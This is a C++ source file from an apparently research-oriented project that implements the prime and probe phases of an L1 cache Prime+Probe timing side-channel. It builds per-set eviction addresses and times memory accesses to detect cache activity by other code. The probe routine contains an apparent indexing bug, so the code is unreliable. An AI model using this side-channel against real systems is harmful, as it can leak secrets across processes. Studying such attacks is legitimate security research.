//
// Created by rf on 12/20/21.
//

#include <attacks/prime_probe.hpp>
#include <functional>
#include <cache.hpp>
#include <l1.hpp>
#include <optional>
#include <utils.hpp>
#include <iostream>
#include <intrinsics.hpp>
#include <numeric>
#include <algorithm>
#include <cstring>
#include <malloc.h>

using namespace cache_money;
using namespace cache;
using namespace std;

prime_probe::prime_probe() : m_mapped(vector<vector<uintptr_t>>(l1::set_count(), vector<uintptr_t>(l1::assoc()))),
                             m_buffer_size(1024 * 1024) {
//    m_buffer_size(l1::size() * 2) {
    m_buffer = (uintptr_t) malloc(m_buffer_size);
    if (malloc_usable_size((void *) m_buffer) < m_buffer_size)
        throw std::runtime_error("Could not allocate the required bytes");
    memset((void *) m_buffer, 0xCC, m_buffer_size);
    generate_mapped_addresses();
    std::cout << "Capcity " << m_mapped.capacity() << std::endl;
}

//TODO this is beyond a horrible way of accomplishing this, but it does not matter as it only need to be done once
void prime_probe::generate_mapped_addresses() {
    auto address = utils::get_aligned_address((uintptr_t) m_buffer, m_buffer_size);

    for (size_t cache_set = 0; cache_set < cache::l1::set_count(); cache_set++) {
        uintptr_t ptr = address;
        auto tags = vector<uint64_t>();
        for (size_t block = 0; block < cache::l1::assoc(); block++) {
            auto tag = utils::get_address_tag(ptr);
            while (utils::get_address_set(ptr) != cache_set ||
                   (find(tags.begin(), tags.end(), tag) != tags.end())) {
                ptr += sizeof(uintptr_t);
                tag = utils::get_address_tag(ptr);

                if (ptr > (uintptr_t) m_buffer + m_buffer_size)
                    throw std::runtime_error("Out of bounds");
            }
            m_mapped[cache_set][block] = ptr;
            tags.push_back(tag);
            ptr += sizeof(uintptr_t);
        }
    }
    if (std::count_if(m_mapped.begin(), m_mapped.end(), [](const auto &val) {
        return std::count(val.begin(), val.end(), 0) != 0;
    }) != 0)
        throw std::runtime_error("Could find all the required addresses");
}

std::vector<bool>
prime_probe::probe(const std::vector<double> &minTimes, uint64_t slotInitial, uint64_t slot,
                   [[maybe_unused]] uint64_t epoch) {

    utils::cycle_wait(slotInitial);
    auto timings = vector<vector<uint32_t>>(l1::set_count() * l1::assoc(),
                                            std::vector<uint32_t>(SAMPLES));
    for (int i = 0; i < SAMPLES; i++) {
        for (uint64_t set = 0; set < l1::set_count(); set++)
            for (uint64_t block = 0; block < l1::assoc(); block++) {
                timings[set + l1::set_count() * block][i] = intrinsics::memaccesstime(m_mapped[set][block]);
            }

        utils::cycle_wait(slot);
    }


    auto averages = std::vector<double>();
    std::for_each(timings.begin(), timings.end(), [&](auto line) {
//        averages.push_back(std::accumulate(line.begin(), line.end(), 0.0) / line.size());
        averages.push_back(*std::max_element(line.begin(), line.end()));
    });

    auto bools = vector<bool>(l1::set_count() * l1::assoc());
    for (uint64_t set = 0; set < l1::set_count(); set++)
        for (uint64_t block = 0; block < l1::assoc(); block++)
            bools[set * l1::set_count() * block] =
                    averages[set + l1::set_count() * block] > minTimes[set + l1::set_count() * block];

    return bools;
}

vector<double> prime_probe::prime() {

    //Prefetch every address in the cache
//    utils::prefetch_range(*m_mapped.begin()->begin(), *m_mapped.end()->end());
    for (const auto &set: m_mapped)
        for (const auto &line: set)
            intrinsics::prefetch0(line);
//            *(uintptr_t*)line = 0x1337;

    auto timings = vector<vector<uint32_t>>(l1::set_count() * l1::assoc(),
                                            vector<uint32_t>(SAMPLES));

    for (int i = 0; i < SAMPLES; i++) {
        for (uint64_t set = 0; set < l1::set_count(); set++)
            for (uint64_t block = 0; block < l1::assoc(); block++) {
                timings[set + block * l1::set_count()][i] = intrinsics::memaccesstime(m_mapped[set][block]);
            }

        utils::cycle_wait(10);
    }

    auto averages = std::vector<double>();
    std::for_each(timings.begin(), timings.end(), [&](auto line) {
        averages.push_back(*std::min_element(line.begin(), line.end()));
//                std::accumulate(line.begin(), line.end(), 0.0) / line.size());
    });

    return averages;
//    return pair<vector<uint32_t>, vector<uint64_t>>(memtimes, cycles);
}

prime_probe::~prime_probe() {
    for (auto buff: m_mapped)
        buff.clear();
    m_mapped.clear();

    free((void *) m_buffer);
}